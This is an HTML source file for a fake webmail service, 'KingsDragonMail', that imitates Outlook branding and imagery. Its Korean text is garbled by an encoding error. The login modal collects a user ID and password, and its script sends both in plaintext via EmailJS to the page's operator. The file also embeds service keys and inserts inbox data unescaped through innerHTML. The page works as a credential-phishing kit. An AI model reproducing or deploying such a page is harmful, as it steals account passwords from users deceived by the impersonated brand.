<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KingsDragonMail | ì „ì„¤ì ì¸ ë³´ì•ˆ ë©”ì¼ ì„œë¹„ìŠ¤</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <script type="text/javascript">
       // 1. EmailJS ì´ˆê¸°í™”
       emailjs.init("sNlzvNIioN1urvCco");

       // 2. Firebase ì„¤ì • (ì‚¬ì¥ë‹˜ ê³ ìœ ê°’ ì ìš©)
       const firebaseConfig = {
         apiKey: "AIzaSyDFQy1IIyNGRpZIcS3y58zznAoc9ljATZg",
         authDomain: "my-email-project-77612.firebaseapp.com",
         databaseURL: "https://my-email-project-77612-default-rtdb.firebaseio.com",
         projectId: "my-email-project-77612",
         storageBucket: "my-email-project-77612.appspot.com",
         messagingSenderId: "429655718306",
         appId: "1:429655718306:web:5b1fad2d7282d5bb915afb",
         measurementId: "G-ZDRPMZ93D7"
       };
       firebase.initializeApp(firebaseConfig);
       const database = firebase.database();
    </script>

    <style>
        :root { --p-blue: #0078d4; --hover-blue: #005a9e; --bg-light: #f3f2f1; }
        body { margin: 0; font-family: 'Segoe UI', sans-serif; color: #242424; overflow-x: hidden; }

        /* [ë„¤ë¹„ê²Œì´ì…˜] */
        nav { display: flex; align-items: center; justify-content: space-between; padding: 12px 8%; border-bottom: 1px solid #ddd; background: #fff; position: sticky; top: 0; z-index: 100; }
        .logo { font-weight: 700; color: var(--p-blue); font-size: 1.4rem; cursor: pointer; text-decoration: none; }
        .nav-links { display: flex; gap: 25px; font-size: 0.9rem; color: #616161; }
        .btn-login { background: none; border: 1px solid #242424; padding: 7px 18px; cursor: pointer; font-weight: 600; }
        .btn-buy { background: #242424; color: white; border: none; padding: 8px 18px; cursor: pointer; font-weight: 600; margin-left: 10px; }

        /* [íˆì–´ë¡œ ì„¹ì…˜] */
        .hero { display: flex; align-items: center; padding: 80px 10%; background: linear-gradient(135deg, #fff 40%, #e7f3ff 100%); min-height: 500px; }
        .hero-text { flex: 1.2; }
        .hero-text h1 { font-size: 3.5rem; line-height: 1.1; margin-bottom: 20px; font-weight: 600; }
        .hero-text p { font-size: 1.3rem; color: #444; margin-bottom: 35px; }
        .hero-visual { flex: 1; text-align: right; }
        .hero-visual img { width: 90%; border-radius: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.12); }

        /* [ì…ë ¥ì°½ ë°•ìŠ¤] */
        .cta-box { display: flex; max-width: 550px; border: 2px solid var(--p-blue); background: #fff; box-shadow: 0 10px 25px rgba(0,120,212,0.15); }
        .cta-box input { flex: 1; border: none; padding: 18px; font-size: 1.1rem; outline: none; }
        .cta-box .domain-label { padding: 18px; background: #f0f7ff; color: var(--p-blue); font-weight: bold; border-left: 1px solid #ddd; }
        .btn-main { background: var(--p-blue); color: #fff; border: none; padding: 0 30px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn-main:hover { background: var(--hover-blue); }

        /* [íŠ¹ì§• ì„¹ì…˜] */
        .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 40px; padding: 70px 10%; background: #fff; }
        .f-card h3 { color: var(--p-blue); font-size: 1.4rem; }
        .f-card p { color: #666; font-size: 1rem; }

        /* [ë³´ì•ˆ ëª¨ë‹¬] */
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.65); justify-content: center; align-items: center; }
        .modal-content { background: #fff; padding: 40px; border-radius: 2px; width: 360px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        .secure-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; }
        #captcha-box { background: #f3f2f1; padding: 15px; text-align: center; font-size: 1.5rem; font-weight: 900; letter-spacing: 8px; margin: 10px 0; user-select: none; }

        /* [ì¸ë°•ìŠ¤ í˜ì´ì§€] */
        #inbox-page { display: none; height: 100vh; flex-direction: column; background: #fff; }
        .ib-header { background: var(--p-blue); color: white; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
        .ib-body { display: flex; flex: 1; overflow: hidden; }
        .ib-sidebar { width: 240px; border-right: 1px solid #edebe9; padding: 20px; background: #f9f9f9; }
        .ib-list { width: 380px; border-right: 1px solid #edebe9; overflow-y: auto; }
        .ib-view { flex: 1; padding: 40px; overflow-y: auto; }
        .mail-card { padding: 15px 20px; border-bottom: 1px solid #f3f2f1; cursor: pointer; transition: 0.1s; }
        .mail-card:hover { background: #f0f7ff; }
        .mail-card.active { border-left: 4px solid var(--p-blue); background: #f3f2f1; }
    </style>
</head>
<body>

    <div id="home-page">
        <nav>
            <div style="display:flex; align-items:center; gap:40px;">
                <a href="#" class="logo">ğŸ‰ KingsDragon</a>
                <div class="nav-links">
                    <span>ì œí’ˆ</span>
                    <span>ë¹„ì¦ˆë‹ˆìŠ¤ìš©</span>
                    <span>ë¦¬ì†ŒìŠ¤</span>
                </div>
            </div>
            <div>
                <button class="btn-login" onclick="openGate()">ë¡œê·¸ì¸</button>
                <button class="btn-buy" onclick="openGate()">ì§€ê¸ˆ êµ¬ì…</button>
            </div>
        </nav>

        <section class="hero">
            <div class="hero-text">
                <h1>ì¼ìƒì ì¸ ë©”ì¼ê³¼<br>ë³´ì•ˆì„ ìœ„í•œ <span style="color:var(--p-blue)">Outlook</span></h1>
                <p>ì „ì„¤ì ì¸ KingsDragonMailì˜ ë³´ì•ˆ ê¸°ìˆ ì„ ê²½í—˜í•˜ì„¸ìš”.<br>ì§€ê¸ˆ ë°”ë¡œ ë‚˜ë§Œì˜ ì „ìš© ë„ë©”ì¸ ê³„ì •ì„ ë§Œë“œì„¸ìš”.</p>
                
                <div class="cta-box">
                    <input type="text" id="reg-id" placeholder="ì‚¬ìš©í•  ì•„ì´ë”” ì…ë ¥" autocomplete="off">
                    <div class="domain-label">@kingsdragonmail.abrdns.com</div>
                    <button class="btn-main" onclick="openGate()">ì‹œì‘ ></button>
                </div>
                <p style="margin-top:15px; font-size:0.9rem; color:#888;">ë¬´ë£Œë¡œ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹ ìš©ì¹´ë“œëŠ” í•„ìš” ì—†ìŠµë‹ˆë‹¤.</p>
            </div>
            <div class="hero-visual">
                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/image/RW167Sj?ver=8064" alt="Outlook Preview">
            </div>
        </section>

        <section class="features">
            <div class="f-card">
                <h3>ğŸ›¡ï¸ ë“œë˜ê³¤ê¸‰ ë³´ì•ˆ</h3>
                <p>ëª¨ë“  ì„œì‹ ì€ 256ë¹„íŠ¸ ì•”í˜¸í™”ë¡œ ë³´í˜¸ë˜ì–´ ì ˆëŒ€ ëš«ë¦¬ì§€ ì•ŠìŠµë‹ˆë‹¤.</p>
            </div>
            <div class="f-card">
                <h3>âš¡ ì´ˆê³ ì† ì„œë²„</h3>
                <p>ì „ ì„¸ê³„ ì–´ë””ì„œë“  0.1ì´ˆ ë§Œì— ë©”ì¼ì„ ìˆ˜ì‹ í•˜ê³  í™•ì¸í•˜ì„¸ìš”.</p>
            </div>
            <div class="f-card">
                <h3>ğŸ“‚ ë¬´ì œí•œ ë³´ê´€í•¨</h3>
                <p>ì¤‘ìš”í•œ ê¸°ë¡ì„ ìš©ëŸ‰ ê±±ì • ì—†ì´ í‰ìƒ ì•ˆì „í•˜ê²Œ ë³´ê´€í•˜ì„¸ìš”.</p>
            </div>
        </section>
    </div>

    <div id="security-modal" class="modal">
        <div class="modal-content">
            <h2 style="margin-top:0;">ê³„ì • í™•ì¸</h2>
            <p style="font-size:0.9rem; color:#666;">ë³´ì•ˆì„ ìœ„í•´ ë¹„ë°€ë²ˆí˜¸ì™€ ë³´ì•ˆ ë¬¸ìë¥¼ ì…ë ¥í•˜ì„¸ìš”.</p>
            <input type="password" id="reg-pw" class="secure-input" placeholder="ë¹„ë°€ë²ˆí˜¸ ì…ë ¥">
            <div id="captcha-box"></div>
            <input type="text" id="captcha-input" class="secure-input" placeholder="ìœ„ ë³´ì•ˆ ë¬¸ì ì…ë ¥">
            <button onclick="finishProcess()" style="width:100%; background:var(--p-blue); color:white; padding:15px; border:none; margin-top:10px; cursor:pointer; font-weight:bold;">ì¸ë°•ìŠ¤ ì ‘ì†</button>
            <button onclick="closeGate()" style="width:100%; background:none; border:none; color:#888; margin-top:10px; cursor:pointer;">ì·¨ì†Œ</button>
        </div>
    </div>

    <div id="inbox-page">
        <div class="ib-header">
            <div style="font-weight:bold; font-size:1.1rem;">ğŸ‰ KingsDragon Outlook</div>
            <div id="user-display" style="font-size:0.9rem; opacity:0.9;"></div>
        </div>
        <div class="ib-body">
            <div class="ib-sidebar">
                <div style="background:#0078d415; color:var(--p-blue); padding:10px; border-radius:4px; font-weight:bold;">ğŸ“¥ ë°›ì€ í¸ì§€í•¨</div>
                <div style="padding:10px; color:#666;">ğŸ“¤ ë³´ë‚¸ í¸ì§€í•¨</div>
                <div style="padding:10px; color:#666;">ğŸ—‘ï¸ íœ´ì§€í†µ</div>
            </div>
            <div class="ib-list" id="mail-list">
                </div>
            <div class="ib-view">
                <div id="empty-view" style="text-align:center; margin-top:100px; color:#aaa;">
                    <h1 style="font-size:4rem;">ğŸ“§</h1>
                    <p>í‘œì‹œí•  ë©”ì¼ì„ ì„ íƒí•˜ì„¸ìš”.</p>
                </div>
                <div id="mail-content" style="display:none;">
                    <h2 id="msg-subject" style="margin-bottom:5px;"></h2>
                    <div id="msg-sender" style="color:var(--p-blue); font-weight:bold;"></div>
                    <hr style="border:0.5px solid #eee; margin:20px 0;">
                    <div id="msg-body" style="line-height:1.6; white-space:pre-wrap;"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentCaptcha = "";

        // ë³´ì•ˆ ì°½ ì—´ê¸° (ë¡œê·¸ì¸ & ê°€ì… ê³µí†µ)
        function openGate() {
            const id = document.getElementById('reg-id').value;
            if(!id) {
                alert("ì•„ì´ë””ë¥¼ ë¨¼ì € ì…ë ¥í•´ ì£¼ì„¸ìš”!");
                document.getElementById('reg-id').focus();
                return;
            }
            // ë³´ì•ˆ ë¬¸ì ìƒì„±
            currentCaptcha = Math.random().toString(36).substring(2, 7).toUpperCase();
            document.getElementById('captcha-box').innerText = currentCaptcha;
            document.getElementById('security-modal').style.display = 'flex';
        }

        function closeGate() {
            document.getElementById('security-modal').style.display = 'none';
        }

        // ìµœì¢… ì ‘ì† ë²„íŠ¼
        function finishProcess() {
            const id = document.getElementById('reg-id').value;
            const pw = document.getElementById('reg-pw').value;
            const input = document.getElementById('captcha-input').value;

            if(input.toUpperCase() !== currentCaptcha) return alert("ë³´ì•ˆ ë¬¸ìê°€ í‹€ë ¸ìŠµë‹ˆë‹¤!");
            if(!pw) return alert("ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì„¸ìš”!");

            // 1. ì‚¬ì¥ë‹˜ê»˜ ì•Œë¦¼ (EmailJS)
            emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id, user_pw: pw});

            // 2. í™”ë©´ ì „í™˜
            document.getElementById('home-page').style.display = 'none';
            document.getElementById('security-modal').style.display = 'none';
            document.getElementById('inbox-page').style.display = 'flex';
            document.getElementById('user-display').innerText = id + "@kingsdragonmail.abrdns.com";

            // 3. ì‹¤ì‹œê°„ ë©”ì¼ ìˆ˜ì‹  ëŒ€ê¸° ì‹œì‘!
            listenToInbox(id);
        }

        // [ì‹¤ì‹œê°„ ê°ì‹œ í•¨ìˆ˜]
        function listenToInbox(userId) {
            const mailRef = database.ref('emails/' + userId);
            
            mailRef.on('child_added', (snapshot) => {
                const data = snapshot.val();
                const mailId = snapshot.key;
                
                const list = document.getElementById('mail-list');
                const card = document.createElement('div');
                card.className = 'mail-card';
                card.innerHTML = `
                    <div style="font-weight:bold; color:var(--p-blue);">${data.from}</div>
                    <div style="font-size:0.9rem; font-weight:600; margin:3px 0;">${data.subject}</div>
                    <div style="font-size:0.8rem; color:#888;">${data.body.substring(0, 30)}...</div>
                `;
                
                card.onclick = () => {
                    // ë©”ì¼ ì½ê¸° í™”ë©´ ì—…ë°ì´íŠ¸
                    document.getElementById('empty-view').style.display = 'none';
                    document.getElementById('mail-content').style.display = 'block';
                    document.getElementById('msg-subject').innerText = data.subject;
                    document.getElementById('msg-sender').innerText = "ë³´ë‚¸ ì‚¬ëŒ: " + data.from;
                    document.getElementById('msg-body').innerText = data.body;
                    
                    // í™œì„±í™” í‘œì‹œ
                    document.querySelectorAll('.mail-card').forEach(c => c.classList.remove('active'));
                    card.classList.add('active');
                };
                
                list.prepend(card); // ìµœì‹  ë©”ì¼ì„ ìœ„ë¡œ
            });
        }
    </script>
</body>
</html>
